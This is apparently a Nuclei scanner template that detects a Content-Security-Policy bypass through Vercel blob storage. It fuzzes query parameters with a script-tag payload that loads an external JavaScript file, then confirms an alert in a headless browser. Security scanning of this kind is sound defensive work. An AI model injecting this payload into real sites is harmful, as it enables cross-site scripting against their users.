id: udgnoz7mccyaowzp-public-blob-vercel-storage-csp-xss

info:
  name: Content-Security-Policy Bypass via Vercel Storage
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,vercel

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"

      - action: waitload

      - action: waitdialog
        name: udgnoz7mccyaowzp_public_blob_vercel_storage_csp_xss
        args:
          type: alert
          timeout: 5000

    matchers:
      - type: dsl
        dsl:
          - "udgnoz7mccyaowzp_public_blob_vercel_storage_csp_xss == true" 